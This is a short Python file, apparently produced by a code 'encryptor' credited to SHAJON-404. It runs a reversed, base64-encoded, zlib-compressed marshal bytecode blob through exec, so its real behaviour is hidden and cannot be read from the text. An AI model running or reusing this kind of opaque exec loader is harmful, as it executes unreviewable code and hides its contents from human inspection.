# ENCRYPTED BY: SHAJON-404
# FACEBOOK : https://www.facebook.com/mdshahmakhdum.shajon
# Github: https://github.com/SHAJON-404
#==============================================#

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'ISyzBCQAxlSGrnZGovRNDXhFlSpBAVfjFDAZWSFBpcR5kiC6VaupkdOJoQAhEi3KJQgStsUzPhUUo06SITVcRewnZKJUZRJXcqlkf+RFEHKUSJVUUC6qg96HaMpkZJ5XfMRl7zJe'))